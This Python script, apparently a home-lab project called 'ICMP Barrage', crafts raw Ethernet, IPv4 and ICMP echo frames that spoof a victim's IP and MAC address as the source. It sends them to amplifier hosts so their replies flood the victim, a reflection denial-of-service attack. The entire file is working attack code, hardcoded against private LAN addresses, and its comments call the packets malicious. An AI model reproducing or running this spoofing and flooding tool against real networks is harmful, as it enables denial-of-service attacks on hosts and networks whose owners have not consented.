import socket
import struct
from sys import byteorder
from binascii import crc32, unhexlify

def compute_checksum(data):
	''' Compute the checksum of an IP packet '''
	# sum the data as a series of 16-bit integers
	acc = sum([int(data[i:i+2].hex(), 16) for i in range(0, len(data), 2)])
	# add carry
	acc = (acc >> 16) + (acc & 0xffff)
	acc += (acc >> 16)
	# return the one's complement of the sum
	return (~acc) & 0xffff

def construct_ICMP_packet():
	''' Construct the core ICMP payload '''
	ping_type = 0x08
	ping_code = 0x00
	headers = 0x00
	# serialize data with zeroed out checksum field
	data = ping_type.to_bytes(1, byteorder) + ping_code.to_bytes(1, byteorder) + b'\x00\x00' + headers.to_bytes(4, byteorder)
	# compute checksum
	checksum = compute_checksum(data)
	# serialize ICMP packet with computed checksum
	return struct.pack("!BBHL", ping_type, ping_code, checksum, headers)

def construct_IP_packet(src, dest):
	''' Construct an IPv4 packet '''
	# FIXME fill in IP packet address fields dynamically and compute checksum
	v_ihl = 0x45 # set version number to 4 (IPv4) # set ihl value to 5 (no options field included)
	tos = 0x00
	length = 0x14 # let length be filled in by kernel
	ident = 0x00 # set packet identity number
	flags = 0x00
	ttl = 0xff # ttl set to max lifetime of 255
	protocol = 0x01 # set to IP protocol 1 (ICMP)
	header_chksm = 0x00 # compute header checksum
	source_ip = socket.inet_aton(src)
	dest_ip = socket.inet_aton(dest)
	serialized = v_ihl.to_bytes(1, byteorder) + tos.to_bytes(1, byteorder) + length.to_bytes(2, byteorder) + ident.to_bytes(2, byteorder) + flags.to_bytes(2, byteorder) + ttl.to_bytes(1, byteorder) + protocol.to_bytes(1, byteorder) + header_chksm.to_bytes(2, byteorder) + source_ip + dest_ip
	checksum = compute_checksum(serialized)
	return struct.pack('!BBHHHBBH4s4s', v_ihl, tos, length, ident, flags, ttl, protocol, checksum, source_ip, dest_ip)


def construct_ETH_packet(src, dest):
	''' Construct an ethernet packet '''
	return dest + src + b'\x08\x00'

def print_header(target):
	''' Print headers to the ICMP Barrage program '''
	title = "  __  ___  _  _  ____    ____   __   ____  ____   __    ___  ____ \n (  )/ __)( \/ )(  _ \  (  _ \ / _\ (  _ \(  _ \ / _\  / __)(  __)\n  )(( (__ / \/ \ ) __/   ) _ (/    \ )   / )   //    \( (_ \ ) _) \n (__)\___)\_)(_/(__)    (____/\_/\_/(__\_)(__\_)\_/\_/ \___/(____)\n"
	#print(title)
	print(f' Orchestrating barrage on {target}...\n')


def icmp_barrage(target, target_mac, amplifiers, amplifier_macs):
	''' Send ping packets to the relays with source IP spoofed '''
	# create a raw socket
	sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
	# bind socket to wireless interface
	sock.bind(("wlp2s0", 0))
	# craft ICMP datagram
	icmp_payload = construct_ICMP_packet()
	# print ICMP barrage headers
	print_header(target)
	# iterate through amplifiers
	for idx, dest in enumerate(amplifiers):
		# craft an IP packet with the victim's source IP and amplifier's destination IP
		ip_packet = construct_IP_packet(target, dest)
		# construct spoofed ethernet 2 frame
		ether = construct_ETH_packet(target_mac, amplifier_macs[idx])
		# append ICMP payload to IP header
		packet = ether + ip_packet + icmp_payload
		checksum = crc32(packet)
		packet += checksum.to_bytes(4, byteorder)
		# send malicious packet to the amplifier
		sock.send(packet)

if __name__ == "__main__":
	icmp_barrage('192.168.1.64', b'\x08\x11\x96\x19\xbe\xec', ['192.168.1.58'], [b'\xb8\x27\xeb\x22\x30\x40'])
